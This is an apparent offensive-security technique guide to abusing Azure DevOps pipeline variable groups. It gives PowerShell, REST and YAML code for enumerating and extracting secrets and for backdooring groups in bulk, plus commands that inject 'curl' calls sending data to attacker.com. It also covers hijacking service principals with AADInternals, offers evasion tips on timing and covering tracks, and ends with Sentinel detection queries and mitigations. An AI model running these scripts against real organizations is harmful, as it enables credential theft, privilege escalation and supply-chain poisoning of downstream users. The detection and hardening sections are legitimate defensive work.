# CA-UNSC-016: Pipeline variable groups abuse

## 1. Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CA-UNSC-016 |
| **MITRE ATT&CK v18.1** | [T1552.001 - Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/) |
| **Tactic** | Credential Access / Privilege Escalation |
| **Platforms** | Entra ID / Azure DevOps / DevOps |
| **Severity** | Critical |
| **CVE** | N/A (Design flaw in permission model) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-06 |
| **Affected Versions** | Azure DevOps Services (all versions), Azure DevOps Server 2016-2025 |
| **Patched In** | No fix available; design limitation in permission delegation model |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections 6 (Atomic Red Team) and 11 (Sysmon Detection) not included because (1) T1552.001 testing varies by CI/CD platform, (2) Sysmon does not capture cloud variable group operations. Remaining sections have been dynamically renumbered.

---

## 2. Executive Summary

**Concept:** Variable groups in Azure DevOps are centralized repositories for storing secrets, API keys, and configuration values that are shared across multiple pipelines. Unlike individual pipeline variables, variable groups have an explicit authorization model and role-based access control. However, the permission delegation mechanism—combined with inadequate audit logging and the ability to modify group membership without peer review—creates a powerful escalation vector. An attacker who gains even low-privileged access (e.g., Contributor role) can identify variable groups they have admin access to (either directly or through group membership), modify secret values, or alter the list of authorized pipelines that can access the group. If "Allow access to all pipelines" is enabled, any malicious pipeline can extract secrets. If linked to Azure Key Vault, the attacker can modify credentials used by downstream infrastructure.

**Attack Surface:** 
- Variable group admin privileges (inherited via security group membership)
- Variable group "Allow all pipelines" authorization setting
- Linked Azure Key Vault service connection and its RBAC permissions
- Service principal ownership of groups or Key Vault access policies
- Shared variable groups accessible across projects (via REST API, if permissions allow)

**Business Impact:** **Full application and infrastructure compromise via supply chain poisoning.** Variable groups often contain database credentials, API keys for payment processors, AWS/Azure service principal credentials, and deployment keys. An attacker who modifies a variable group used by a build pipeline can inject malicious environment variables that poison the compiled artifact (binary, container image, package). When thousands of downstream consumers pull the poisoned artifact, the backdoor activates in their production environments. Alternatively, the attacker can exfiltrate secrets from the variable group to establish persistent lateral movement.

**Technical Context:** Exploitation is trivial—often a single REST API call or UI interaction. Detection is weak because variable group modifications are logged as routine administrative actions. Many organizations fail to audit variable group access or enforce approval workflows on secret modifications.

### Operational Risk
- **Execution Risk:** Low - No special tools required; REST API or Azure CLI is sufficient
- **Stealth:** Medium - Variable group modifications appear as routine admin actions; but bulk changes or unusual timing may trigger alerts
- **Reversibility:** Partial - Modified secrets can be reverted, but if poisoned artifacts already shipped, impact is permanent

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.2.1, 1.2.3 | Secrets management and change approval |
| **DISA STIG** | WN10-AU-000500 | Absence of pipeline audit logging for credential modifications |
| **CISA SCuBA** | GCI-1.2 | Pipeline configuration and access controls |
| **NIST 800-53** | AC-6 (Least Privilege), SC-7 (Boundary Protection), IA-5 (Authentication), SA-3 (System Development Life Cycle) | Restrict admin access to variable groups, require change approvals, enforce secure development practices |
| **GDPR** | Art. 32 (Security of Processing) | Failure to implement technical measures to prevent unauthorized modification of personal data credentials |
| **DORA** | Art. 9 (Protection and Prevention), Art. 10 (Detection and Response) | Detect unauthorized access to critical CI/CD components |
| **NIS2** | Art. 21.1 (Risk Management), Art. 21.5 (Continuous Improvement) | Supply chain risk management and incident response |
| **ISO 27001** | A.9.2.1 (User registration and access rights), A.9.2.3 (Management of privileged access), A.9.4.1 (Information access restriction) | Role-based access control, approval workflows for privileged actions |
| **ISO 27005** | 7.4.3 (Privilege Escalation Risk) | Risk of unauthorized credential modification via permission inheritance |

---

## 3. Technical Prerequisites

**Required Privileges:**
- To view variable groups: Contributor or higher
- To modify variable groups: Administrator role (direct or inherited via group membership)
- To modify linked Azure Key Vault: Service connection must have Key Vault editor role

**Required Access:**
- Project-level access to Azure DevOps (at least Contributor)
- Optional: Ownership of a security group that inherits admin permissions to variable group
- Optional: Service principal credentials (if attacking via REST API)

**Supported Versions:**
- **Azure DevOps:** All versions (Services, Server 2016, 2019, 2022, 2025)
- **PowerShell:** 5.0+ (Windows), 7.0+ (cross-platform)
- **Azure CLI:** 2.30.0+ (with devops extension)

**Tools:**
- [Azure DevOps CLI](https://learn.microsoft.com/en-us/cli/azure/) (v2.30.0+)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (v2.50.0+)
- Standard REST API client: `curl`, `Invoke-WebRequest`, Postman
- [AADInternals PowerShell Module](https://github.com/Gerenios/AADInternals) - for lateral movement

---

## 4. Detailed Execution Methods

### METHOD 1: Enumerate and Modify Variable Groups via UI (No Tools Required)

**Supported Versions:** All Azure DevOps versions

#### Step 1: Discover Variable Groups You Have Access To

**Objective:** Identify which variable groups you (or your security group) have administrator access to.

**Manual Steps (Azure Portal):**

1. Navigate to **Azure DevOps** → Your **Project**
2. Select **Pipelines** → **Library** (left menu)
3. Scroll through the list of **Variable groups**
4. For each group, note:
   - Group name
   - Which pipelines are authorized ("Pipeline permissions" tab)
   - Whether "Allow access to all pipelines" is enabled
   - If linked to Azure Key Vault
5. Click on a group to see **Security** tab and check your permissions:
   - If you see "Administrator" role assigned to you or a group you belong to, you can modify the group

**What to Look For:**
- Variable groups with sensitive names: `prod-secrets`, `database-credentials`, `api-keys`, `service-principal-creds`
- Groups authorized for "all pipelines" (highest risk)
- Groups linked to Key Vault (enables infrastructure compromise)
- Groups with few audit entries (weak detection)

**OpSec & Evasion:**
- Detection likelihood: **Low** - Simply viewing variable groups is normal administrative activity
- Evasion: Avoid bulk enumeration; access groups one at a time with natural timing

**Troubleshooting:**

- **Issue:** You see "Security" tab but no permissions displayed
  - **Cause:** You don't have admin access to this group's security settings
  - **Fix:** Look for other groups you have access to; check your Entra ID group memberships

---

#### Step 2: Modify Variable Group Secrets

**Objective:** Change secret values in a variable group to inject malicious environment variables or poison build artifacts.

**Manual Steps (Azure Portal):**

1. Navigate to **Pipelines** → **Library**
2. Select a variable group you have **Administrator** access to
3. On the variable group page, you can:
   - **Edit existing variables:** Click on a variable's value field and type a new value
   - **Add new variables:** Click **+ Add** and enter name/value
   - **Mark as secret:** Toggle the lock icon to encrypt/hide the value
4. Click **Save**

**Example Modification for Supply Chain Attack:**

```
Before:
DATABASE_PASSWORD=SecurePassword123!

After (Malicious):
DATABASE_PASSWORD=SecurePassword123!; curl http://attacker.com/exfil?data=$(whoami)
```

This injected command will execute whenever the environment variable is used in a script.

**Expected Output:**
```
Variable group saved successfully
```

**What This Means:**
- All pipelines authorized to use this group now have the malicious environment variable
- Any script that uses this variable (e.g., `$env:DATABASE_PASSWORD`) will execute the injected command
- If this group is used in a build pipeline, the command executes during build, exfiltrating credentials or poisoning artifacts

**OpSec & Evasion:**
- Detection likelihood: **Medium** - Modification is logged in audit logs, but easy to hide in bulk changes
- Evasion techniques:
  - Modify value to look legitimate (e.g., "add parameter" instead of "execute command")
  - Use obfuscation: Base64-encode command, decode at runtime
  - Modify only one character (harder to detect as malicious)
  - Timing: Make change during shift change or Friday afternoon (high-noise periods)

**Troubleshooting:**

- **Error:** "You don't have permission to edit this variable group"
  - **Cause:** You lack Administrator role on this group
  - **Fix:** Identify your security group memberships; check if another admin group has access
  - **Escalation:** Try to add yourself to a group that has admin access (see Method 2)

- **Error:** "Secret value cannot be edited via UI"
  - **Cause:** Some systems mask secret variables in UI for security
  - **Fix:** Use REST API instead (see Method 2)

**References:**
- [Microsoft Learn: Manage variable groups](https://learn.microsoft.com/en-us/azure/devops/pipelines/library/variable-groups?view=azure-devops)
- [Black Hat EU-23: Hiding in the Clouds](https://i.blackhat.com/EU-23/Presentations/Whitepapers/EU-23-Hawkins-Hiding-in-the-Clouds-wp.pdf)

---

#### Step 3: Add Unauthorized Pipelines to Variable Group Access

**Objective:** Modify "Pipeline permissions" to allow a malicious pipeline to access the group's secrets.

**Manual Steps:**

1. Navigate to **Pipelines** → **Library**
2. Select the variable group
3. Click **Pipeline permissions** tab
4. Click **+** button to add a new pipeline
5. Select a malicious pipeline you control (or create a new one)
6. The pipeline is now authorized to access all secrets in this group

**Alternative: Enable "Allow access to all pipelines"**

1. On the same **Pipeline permissions** tab
2. Click **More actions** (...) → **Open access**
3. Confirm: Click **Open access** again
4. Now ALL pipelines in the project can access this group's secrets

**What This Means:**
- Your malicious pipeline can now call the variable group in its YAML
- All secrets become accessible via `$(VariableName)` syntax
- If the group is set to "all pipelines", any pipeline created by any user in the project can extract secrets

**Example YAML Pipeline (Attacker-Controlled):**

```yaml
trigger:
  - main

pool:
  vmImage: 'ubuntu-latest'

variables:
  - group: CompanySecrets  # Newly authorized

steps:
  - task: Bash@3
    inputs:
      targetType: 'inline'
      script: |
        # Extract all environment variables from variable group
        env | grep -E "DATABASE|API|SECRET|CREDENTIAL" | base64 | curl -d @- http://attacker.com/exfil
```

**OpSec & Evasion:**
- Detection likelihood: **Medium-High** - Authorization changes are logged
- Evasion: Add authorization under a different account (e.g., shared service account), or during bulk permission changes

**References:**
- [Microsoft Learn: Variable group authorization](https://learn.microsoft.com/en-us/azure/devops/pipelines/library/variable-groups?view=azure-devops#authorization-via-the-pipelines-ui)

---

### METHOD 2: Abuse Variable Groups via REST API (Programmatic Exploitation)

**Supported Versions:** All Azure DevOps versions

#### Step 1: Enumerate Variable Groups via REST API

**Objective:** Programmatically list all variable groups in a project and identify those with secrets.

**Command:**

```powershell
# Authentication via PAT or System.AccessToken
$pat = "your_personal_access_token_here"
$orgUrl = "https://dev.azure.com/contoso"
$project = "MyProject"

# Base64 encode PAT for Basic auth
$encodedPat = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes(":$pat"))
$headers = @{Authorization = "Basic $encodedPat"}

# List all variable groups in project
$url = "$orgUrl/$project/_apis/distributedtask/variablegroups?api-version=6.0-preview.2"
$response = Invoke-RestMethod -Uri $url -Headers $headers -Method Get

# Display results
$response.value | ForEach-Object {
    Write-Host "Group ID: $($_.id), Name: $($_.name), Type: $($_.type), Authorized: $($_.authorized)"
    if ($_.type -eq "AzureKeyVault") {
        Write-Host "  ├─ Linked to Azure Key Vault: $($_.providerData.vault)"
        Write-Host "  └─ Service Connection: $($_.providerData.serviceEndpointId)"
    }
}
```

**Expected Output:**

```
Group ID: 1, Name: BuildSecrets, Type: Vsts, Authorized: true
Group ID: 2, Name: ProdDatabase, Type: AzureKeyVault, Authorized: true
  ├─ Linked to Azure Key Vault: prod-keyvault
  └─ Service Connection: 12345
Group ID: 3, Name: NuGetApiKeys, Type: Vsts, Authorized: true
```

**What This Means:**
- `Type: Vsts` = Manually created variable group (non-secret values visible via API)
- `Type: AzureKeyVault` = Linked to Key Vault (values not exposed directly, but service connection reveals where they're stored)
- `Authorized: true` = Your PAT/token has permission to access

**OpSec & Evasion:**
- Detection likelihood: **Low** - API enumeration is normal; bulk calls may trigger alerts
- Alternative: Use Azure CLI instead of PowerShell for less obvious activity

---

#### Step 2: Extract Secrets from Variable Group

**Objective:** Retrieve actual secret values from a variable group.

**Command:**

```powershell
# Get specific variable group details
$groupId = 1  # From previous enumeration
$groupUrl = "$orgUrl/$project/_apis/distributedtask/variablegroups/$groupId"
$groupDetails = Invoke-RestMethod -Uri $groupUrl -Headers $headers -Method Get

# Display all variables
Write-Host "Variables in group $($groupDetails.name):"
$groupDetails.variables | ForEach-Object {
    $varName = $_.Key
    $isSecret = $_.Value.isSecret
    $value = if ($isSecret) { "***MASKED***" } else { $_.Value.value }
    Write-Host "  $varName = $value (Secret: $isSecret)"
}

# If non-secret variables, values are plaintext
# If secret variables, they may be masked (depends on Azure DevOps version)
# To decrypt secret variables:
# - Use System.AccessToken from within pipeline job
# - Or negotiate decryption with Azure DevOps API (limited support)
```

**Expected Output (For Non-Secret Variables):**

```
Variables in group BuildSecrets:
  NUGET_API_KEY = NuGetApiKey9876543210ABCDEF (Secret: false)
  REGISTRY_USERNAME = containeradmin (Secret: false)
  REGISTRY_PASSWORD = ***MASKED*** (Secret: true)
```

**What This Means:**
- Non-secret variables are exposed in plaintext
- Secret variables are masked in REST API response (but accessible in running pipeline)
- If you have System.AccessToken (from pipeline job), you can decrypt secrets

**OpSec & Evasion:**
- Detection likelihood: **Medium** - Repeated access to groups triggers alerts
- Alternative: If you have pipeline execution access, run the extraction within pipeline (see Method 3)

---

#### Step 3: Modify Variable Group Secrets via REST API

**Objective:** Programmatically change secret values in a variable group.

**Command:**

```powershell
# Get current variable group state (to preserve other variables)
$groupId = 1
$groupUrl = "$orgUrl/$project/_apis/distributedtask/variablegroups/$groupId"
$currentGroup = Invoke-RestMethod -Uri $groupUrl -Headers $headers -Method Get

# Modify a specific variable
$currentGroup.variables["REGISTRY_PASSWORD"].value = "NewMaliciousPassword123!"
$currentGroup.variables["NUGET_API_KEY"].value = "NewRogueApiKey456!"

# Alternative: Add a new variable with malicious content
$currentGroup.variables["BACKUP_EXFIL_URL"] = @{
    isSecret = $false
    value = "http://attacker.com/exfil"
}

# Send the updated group back to Azure DevOps
$updateUrl = "$orgUrl/$project/_apis/distributedtask/variablegroups/$groupId"
$body = $currentGroup | ConvertTo-Json -Depth 10
Invoke-RestMethod -Uri $updateUrl -Headers $headers -Method Put -Body $body -ContentType "application/json"

Write-Host "Variable group $groupId updated successfully"
```

**Expected Output:**

```
Variable group 1 updated successfully
```

**What This Means:**
- All pipelines using this group now have the modified secrets
- Next pipeline execution will use the new values
- If this group is used in build pipelines, the malicious value will be injected into the build environment

**OpSec & Evasion:**
- Detection likelihood: **Medium-High** - Modification is logged with timestamp
- Evasion: Modify only one variable at a time; use legitimate-sounding names
- Timing: Perform modifications during high-activity periods

**Troubleshooting:**

- **Error:** 401 Unauthorized
  - **Cause:** PAT is invalid, expired, or lacks permission
  - **Fix:** Generate new PAT with `Read & manage` scope for Pipeline Library

- **Error:** 403 Forbidden
  - **Cause:** Your account lacks Administrator role on this group
  - **Fix:** Check security group membership; may need to escalate first

**References:**
- [Microsoft Azure DevOps REST API: Variablegroups - Update](https://learn.microsoft.com/en-us/rest/api/azure/devops/distributedtask/variablegroups/update)

---

### METHOD 3: Chain Variable Group Abuse with Azure Key Vault Compromise

**Supported Versions:** All Azure DevOps versions with Key Vault integration enabled

#### Step 1: Identify Variable Groups Linked to Azure Key Vault

**Objective:** Find variable groups that are proxies to sensitive Key Vault secrets.

**Command:**

```powershell
# List all variable groups with Azure Key Vault links
$response = Invoke-RestMethod -Uri "$orgUrl/$project/_apis/distributedtask/variablegroups?api-version=6.0-preview.2" -Headers $headers -Method Get

$keyVaultGroups = $response.value | Where-Object { $_.type -eq "AzureKeyVault" }

foreach ($group in $keyVaultGroups) {
    Write-Host "Variable Group: $($group.name)"
    Write-Host "  ID: $($group.id)"
    Write-Host "  Key Vault: $($group.providerData.vault)"
    Write-Host "  Service Connection: $($group.providerData.serviceEndpointId)"
    Write-Host "  Secrets: $($group.variables.Count)"
    $group.variables.Keys | ForEach-Object { Write-Host "    - $_" }
}
```

**Expected Output:**

```
Variable Group: ProductionSecrets
  ID: 5
  Key Vault: prod-keyvault
  Service Connection: a1b2c3d4-e5f6-7890
  Secrets: 3
    - db-password
    - app-secret-key
    - oauth-client-secret
```

**What This Means:**
- This group is a link to Azure Key Vault
- The Service Connection uses a service principal with Key Vault access
- Modifying the Key Vault service connection's permissions = breaking the group

---

#### Step 2: Abuse Service Connection to Access/Modify Key Vault

**Objective:** Use the service connection's credentials to access and modify the underlying Key Vault.

**Command:**

```powershell
# Get the service connection details
$serviceConnId = "a1b2c3d4-e5f6-7890"  # From previous step
$connUrl = "$orgUrl/$project/_apis/serviceendpoint/$serviceConnId"
$connection = Invoke-RestMethod -Uri $connUrl -Headers $headers -Method Get

Write-Host "Service Connection Details:"
Write-Host "  Name: $($connection.name)"
Write-Host "  Auth Type: $($connection.authorization.parameters.authenticationType)"
Write-Host "  Subscription: $($connection.data.subscriptionName)"

# If it's a Service Principal, extract its Object ID (if accessible)
# Then modify Key Vault access policies via Azure Resource Manager API
if ($connection.type -eq "AzureRM") {
    $spnObjectId = $connection.authorization.parameters.servicePrincipalId
    Write-Host "  Service Principal ID: $spnObjectId"
    
    # Now you can:
    # 1. Add yourself to Key Vault access policies
    # 2. Modify Key Vault secret values
    # 3. Rotate credentials and lock out legitimate users
}
```

**Expected Output:**

```
Service Connection Details:
  Name: Azure-Prod-Subscription
  Auth Type: ServicePrincipalCertificate
  Subscription: prod-subscription-123
  Service Principal ID: 12345678-90ab-cdef-1234-567890abcdef
```

**What This Means:**
- You've identified the service principal used by the variable group
- This principal likely has edit permissions in Key Vault
- With this information, you can attack the Key Vault directly

---

#### Step 3: Escalate via Service Principal Role Assignment

**Objective:** Add a malicious secret/certificate to the service principal, then authenticate as it to access Azure infrastructure.

**Command (Using Entra ID APIs):**

```powershell
# Import AADInternals
Import-Module AADInternals

# Assuming you have the service principal's application ID and credentials (from Key Vault or elsewhere):
$appId = "12345678-90ab-cdef-1234-567890abcdef"
$tenantId = "87654321-ba98-fedc-4321-0fedcba98765"

# Method 1: If you can modify service principal (via Application Admin role)
# Add a malicious client secret
Add-AADIntServicePrincipalSecret -ServicePrincipalId $appId -TenantId $tenantId

# Method 2: Use the SPN credentials to access Azure resources
# (If you already have the current credentials)
$credentials = @{
    appId = $appId
    password = "stolen_password_from_keyvault"
    tenantId = $tenantId
}

# Authenticate as the service principal
Connect-AzAccount -ServicePrincipal -Credential $credentials

# List accessible resources
Get-AzSubscription
Get-AzResourceGroup
```

**OpSec & Evasion:**
- Detection likelihood: **High** - Service principal role modifications are audited
- Evasion: Use credentials briefly, then delete the secret/certificate to cover tracks

**References:**
- [AADInternals: Service Principal Management](https://aadinternals.com/aadinternals/)
- [Semperis: Service Principal Ownership Abuse](https://www.semperis.com/blog/service-principal-ownership-abuse-in-entra-id/)

---

### METHOD 4: Exploit Variable Group Admin Delegation for Privilege Escalation

**Supported Versions:** All Azure DevOps versions

#### Step 1: Identify Security Groups with Admin Access to Variable Groups

**Objective:** Find which Entra ID/Active Directory groups have administrator role on variable groups.

**Manual Steps (Azure Portal):**

1. Navigate to **Pipelines** → **Library**
2. Select a variable group
3. Click **Security** tab
4. Note all groups/users with **Administrator** role
5. Check if you are a member of any of these groups:
   - Go to **Organization Settings** → **Users** → **Groups**
   - Or check Entra ID directly

**Command (Via REST API):**

```powershell
# Get variable group security details
$groupId = 1
$securityUrl = "$orgUrl/_apis/securityroles/scopes/distributedtask.library/roleassignments/resources/variablegroups/$groupId"
$security = Invoke-RestMethod -Uri $securityUrl -Headers $headers -Method Get

$security.value | ForEach-Object {
    Write-Host "Identity: $($_.identity.displayName)"
    Write-Host "  Type: $($_.identity.entityType)"
    Write-Host "  Role: $($_.role.name)"
}
```

**Expected Output:**

```
Identity: Build Administrators
  Type: Group
  Role: Administrator
Identity: john.doe@company.com
  User
  Role: Administrator
```

**What This Means:**
- "Build Administrators" group has admin access to this variable group
- If you can add yourself to "Build Administrators", you inherit admin access
- User john.doe@company.com directly has admin access

---

#### Step 2: Add Yourself to a Group with Variable Group Admin Access

**Objective:** Escalate privileges by joining a group that already has admin permissions.

**Manual Steps (Azure Portal - If You Have Access):**

1. Go to **Organization Settings** → **Teams and Security Groups**
2. Find a group that has admin access to variable groups (e.g., "Build Administrators")
3. Click on the group
4. Click **Members**
5. Click **+ Add** and search for your user
6. Select yourself and click **Save**

**Alternative (Via REST API - If You Can):**

```powershell
# Add user to a security group
$groupId = "your-group-id"
$userId = "your-user-object-id"
$addUrl = "$orgUrl/_apis/identities/groups/$groupId/members/$userId"
Invoke-RestMethod -Uri $addUrl -Headers $headers -Method Put
```

**What This Means:**
- You now have Administrator access to all variable groups that "Build Administrators" manages
- You can modify any variable group secrets
- Changes take effect immediately for subsequent pipeline runs

**OpSec & Evasion:**
- Detection likelihood: **Medium-High** - Group membership changes are logged
- Evasion: Use a service account or shared account; modify during high-activity times

**Troubleshooting:**

- **Error:** "You don't have permission to modify this group"
  - **Cause:** Insufficient privileges (not a group owner)
  - **Fix:** Find a group that you already have owner/admin access to, then escalate from there

---

#### Step 3: Leverage Admin Access to Modify Variable Groups at Scale

**Objective:** Now that you have admin access, modify multiple variable groups to inject backdoors or exfiltrate secrets across the organization.

**Command:**

```powershell
# Get all variable groups in project
$allGroups = (Invoke-RestMethod -Uri "$orgUrl/$project/_apis/distributedtask/variablegroups" -Headers $headers -Method Get).value

# Modify each group to add a backdoor
foreach ($group in $allGroups) {
    if ($group.type -eq "Vsts") {  # Only modify non-Key Vault groups
        # Add a new variable with attacker's exfiltration URL
        $group.variables["EXFIL_ENDPOINT"] = @{
            isSecret = $false
            value = "http://attacker.com/callback"
        }
        
        # Update the group
        $updateUrl = "$orgUrl/$project/_apis/distributedtask/variablegroups/$($group.id)"
        Invoke-RestMethod -Uri $updateUrl -Headers $headers -Method Put -Body ($group | ConvertTo-Json -Depth 10) -ContentType "application/json"
        
        Write-Host "Modified variable group: $($group.name)"
    }
}

Write-Host "Successfully injected backdoor into all variable groups"
```

**What This Means:**
- All pipelines using any of these groups now have a backdoor variable
- Attacker-controlled endpoint is now part of the build environment
- Can be used to exfiltrate secrets or trigger malicious actions

**OpSec & Evasion:**
- Detection likelihood: **High** - Bulk modifications are suspicious
- Evasion: Spread modifications over time; modify only high-traffic groups; use legitimate-sounding variable names

**References:**
- [GitProtect: Azure DevOps Security Best Practices](https://gitprotect.io/blog/azure-devops-security-best-practices/)
- [Black Hat EU-23: Hiding in the Clouds](https://i.blackhat.com/EU-23/Presentations/Whitepapers/EU-23-Hawkins-Hiding-in-the-Clouds-wp.pdf)

---

## 5. Tools & Commands Reference

### [Azure DevOps REST API](https://learn.microsoft.com/en-us/rest/api/azure/devops/)

**Base URL:** `https://dev.azure.com/{organization}/{project}/_apis/distributedtask/variablegroups`

**Authentication:** Basic Auth (PAT) or Bearer Token (System.AccessToken)

**Key Endpoints:**

| Method | Endpoint | Purpose |
|---|---|---|
| GET | `/variablegroups` | List all variable groups |
| POST | `/variablegroups` | Create new variable group |
| GET | `/variablegroups/{id}` | Get variable group details |
| PUT | `/variablegroups/{id}` | Update variable group |
| DELETE | `/variablegroups/{id}` | Delete variable group |

---

### [Azure DevOps CLI](https://learn.microsoft.com/en-us/cli/azure/devops)

**Installation:**

```bash
az extension add --name azure-devops
az devops configure --defaults organization=https://dev.azure.com/contoso project=MyProject
```

**Common Commands:**

```bash
# List variable groups
az pipelines variable-group list --output table

# Create variable group
az pipelines variable-group create --name my-group --variables key1=value1 key2=value2

# Update variable group
az pipelines variable-group update --group-id 1 --name new-name

# Delete variable group
az pipelines variable-group delete --group-id 1 --yes

# List variables in group
az pipelines variable-group variable list --group-id 1

# Add variable
az pipelines variable-group variable create --group-id 1 --name newvar --value newvalue

# Update variable
az pipelines variable-group variable update --group-id 1 --name existingvar --value updatedvalue

# Delete variable
az pipelines variable-group variable delete --group-id 1 --name oldvar
```

---

### [AADInternals PowerShell Module](https://github.com/Gerenios/AADInternals)

**For Post-Exploitation: Entra ID Privilege Escalation**

```powershell
Import-Module AADInternals

# Enumerate security groups
Get-AADIntGroups

# Enumerate service principals
Get-AADIntServicePrincipals

# Add yourself to a group (if you have permissions)
Add-AADIntGroupMember -GroupId "group-guid" -UserId "your-user-id"

# Add a client secret to a service principal (hijacking)
New-AADIntServicePrincipalSecret -ServicePrincipalId "spn-guid" -TenantId "tenant-id"
```

---

## 6. Microsoft Sentinel Detection

### Query 1: Detect Variable Group Permission Changes

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, Properties, InitiatedBy
- **Alert Severity:** High
- **Frequency:** Every 5 minutes

**KQL Query:**

```kusto
AuditLogs
| where OperationName in (
    "Update variable group",
    "Delete variable group",
    "Modify variable group security"
    )
| where ActivityDetails contains "Administrator" or ActivityDetails contains "secret"
| where TimeGenerated > ago(1h)
| project TimeGenerated, InitiatedBy, OperationName, ActivityDetails, IpAddress
| summarize ModificationCount = count() by InitiatedBy, bin(TimeGenerated, 5m)
| where ModificationCount > 2  # Multiple modifications in short timeframe
```

**What This Detects:**
- Rapid modifications to variable group permissions
- Changes to variable group secrets
- Bulk changes by single user

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Suspicious Variable Group Modifications`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents from alerts triggered by this analytics rule**
7. Click **Review + create** → **Create**

---

### Query 2: Detect Variable Group Secret Exfiltration via Pipeline

**Rule Configuration:**
- **Required Table:** AuditLogs, PipelineJobLogs (if forwarded)
- **Alert Severity:** Critical

**KQL Query:**

```kusto
AuditLogs
| where OperationName == "PipelineJobCompleted"
    or OperationName == "PipelineJobStarted"
| where ActivityDetails contains "variablegroups" or ActivityDetails contains "secret"
| where Properties contains "curl" or Properties contains "Invoke-WebRequest" or Properties contains "exfil"
| project TimeGenerated, InitiatedBy, OperationName, IpAddress
```

**What This Detects:**
- Pipeline jobs accessing variable groups with explicit exfiltration patterns
- Commands attempting to extract and transmit secrets

---

## 7. Windows Event Log Monitoring

**Event ID: 4674 (Privileged Object Operation)**
- **Log Source:** Security (if Azure DevOps Server on-premises)
- **Trigger:** Privilege check failure or success on variable group resource
- **Applies To Versions:** Azure DevOps Server 2016-2025 (on-premises only)

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Privileged Object Access** → **Audit Privileged Service Call**
4. Set to: **Success and Failure**
5. Run `gpupdate /force`

**Filter Patterns to Monitor:**

- Service/Object: "VariableGroup"
- Privilege: "Administrator"
- Access Mask: "WRITE_DAC" (permission modification)

---

## 8. Defensive Mitigations

### Priority 1: CRITICAL

* **Enforce Change Approval for Variable Group Modifications:**
  
  **Applies To Versions:** All Azure DevOps versions
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Pipelines** → **Library**
  2. Select a sensitive variable group
  3. Click **Approvals and checks** tab
  4. Click **+ Add check**
  5. Select **Approval**
  6. Assign approvers (e.g., Security team members)
  7. Click **Create**
  
  **Effect:** Any modification to this variable group now requires approval from designated users before taking effect.

* **Restrict Variable Group Administrator Access:**
  
  **Manual Steps:**
  1. Go to **Pipelines** → **Library**
  2. Select variable group
  3. Click **Security** tab
  4. Remove unnecessary users/groups from **Administrator** role
  5. Add only trusted admins:
     - Security team members
     - DevOps leads
     - Limit to < 5 people per group
  6. Click **Save**
  
  **Validation Command:**
  ```powershell
  # List all variable groups and their administrators
  $allGroups = (Invoke-RestMethod -Uri "$orgUrl/$project/_apis/distributedtask/variablegroups" -Headers $headers -Method Get).value
  $allGroups | ForEach-Object {
      Write-Host "Group: $($_.name)"
      Write-Host "  Admins count: (check via UI)"
  }
  ```

* **Disable "Allow access to all pipelines" by Default:**
  
  **Manual Steps:**
  1. For each variable group, ensure "Allow access to all pipelines" is **OFF**
  2. Instead, explicitly authorize only the pipelines that need access
  3. Go to **Pipelines** → **Library** → Select group → **Pipeline permissions**
  4. Verify list is specific (not "Open access")
  5. Remove pipelines that no longer need access
  
  **Policy (Organization-Level):**
  1. Go to **Organization Settings** → **Policies**
  2. Enable: "Restrict secret variables to authorized pipelines"
  3. This prevents global sharing by default

* **Encrypt Secret Variables at Rest:**
  
  **Manual Steps:**
  1. For each variable group, mark sensitive variables as **secret**
  2. Go to **Pipelines** → **Library** → Select group
  3. For each variable, toggle the **lock icon** to encrypt
  4. Save the group
  
  **Verification:**
  ```powershell
  # Check if secrets are marked as encrypted
  $group = Invoke-RestMethod -Uri "$orgUrl/$project/_apis/distributedtask/variablegroups/1" -Headers $headers -Method Get
  $group.variables | ForEach-Object {
      Write-Host "$($_.Key): Secret=$($_.Value.isSecret)"
  }
  ```

---

### Priority 2: HIGH

* **Implement Separate Variable Groups by Environment:**
  
  **Pattern:**
  - `dev-secrets` - Development credentials (lower sensitivity)
  - `staging-secrets` - Staging environment (medium sensitivity)
  - `prod-secrets` - Production (highest sensitivity)
  
  **Access Control:**
  - Dev: All developers
  - Staging: Staging admin + developers
  - Prod: Only deployment pipeline service account + security approvals
  
  **Manual Steps:**
  1. Create separate groups for each environment
  2. Apply different authorization policies per group
  3. Use approvals only on Prod groups

* **Audit Variable Group Access Regularly:**
  
  **Monthly Review Process:**
  1. Generate audit logs for variable group operations:
     ```powershell
     $query = @{
         "searchFilters" = @(@{
             "name" = "Activity"
             "value" = "Update variable group"
         })
     }
     # Use Azure DevOps Audit Log API
     ```
  2. Review who modified groups and when
  3. Remove obsolete or suspicious access
  4. Document changes in security log

* **Use Azure Key Vault for Sensitive Secrets Only:**
  
  **Manual Steps:**
  1. For production secrets: Link variable group to Azure Key Vault
  2. Do NOT store plaintext secrets in variable groups
  3. For development: Store in variable groups (lower risk)
  4. Ensure Key Vault access policies are restrictive:
     - Go to **Azure Portal** → **Key Vaults**
     - Select vault → **Access policies**
     - Remove unnecessary principals
     - Require MFA for modifications

---

### Priority 3: MEDIUM

* **Implement Security Group-Based Access:**
  
  **Pattern:**
  - Instead of individual user access, use security groups
  - Group membership is easier to audit and revoke
  
  **Manual Steps:**
  1. Create security groups in Entra ID:
     - `ado-var-group-admins` - For variable group administrators
     - `ado-developers` - For standard developers
  2. Assign these groups to variable groups instead of individual users
  3. When a person leaves, remove from group (single action, not per-resource)

* **Enable Conditional Access for Variable Group Modifications:**
  
